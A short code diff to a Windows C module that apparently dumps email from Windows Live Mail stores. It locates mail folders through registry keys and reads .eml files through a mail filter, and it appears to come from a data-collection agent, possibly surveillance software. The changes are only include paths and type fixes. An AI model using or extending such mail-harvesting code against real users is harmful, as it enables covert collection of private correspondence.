@@ -10,9 +10,9 @@
 
 #include <stdio.h>
 #include <windows.h>
-#include "../common.h"
+#include "../../H4DLL/common.h"
 #include "MailAgent.h"
-#include "../LOG.h"
+#include "../../H4DLL/LOG.h"
 
 #define WLM_4GB 0xFFFFFFFF
 #define WLM_MAIL_READ_FULL   0xDEAD
@@ -194,7 +194,7 @@ void FetchWindowsLiveMailMessages(const WCHAR *folder, mail_filter_struct *mail_
 			continue;
 		}
 
-		if(finddata.cFileName[0] == L'.' || !wcsicmp(finddata.cFileName, L"WLMailSearchSentinel.eml")) 
+		if(finddata.cFileName[0] == L'.' || !_wcsicmp(finddata.cFileName, L"WLMailSearchSentinel.eml")) 
 			continue;
 		if(_wsplitpath_s(finddata.cFileName, NULL, 0, NULL, 0, NULL, 0, buf, sizeof(buf)/sizeof(buf[0])) || wcscmp(buf, L".eml")) 
 			continue;
@@ -249,7 +249,8 @@ void FetchWindowsLiveMailMessages(const WCHAR *folder, mail_filter_struct *mail_
 
 BOOL WLM_DumpEmails(mail_filter_struct *mail_filter)
 {
-	WCHAR *keycur, *keyarray[] = { L"Software\\Microsoft\\Windows Live Mail", L"Software\\Microsoft\\Windows Mail", NULL };
+	const WCHAR* keycur;
+	const WCHAR *keyarray[] = { L"Software\\Microsoft\\Windows Live Mail", L"Software\\Microsoft\\Windows Mail", NULL };
 	WCHAR buf[MAX_PATH], storeroot[MAX_PATH];
 	DWORD len, keycount;
 	HKEY appkey = NULL;
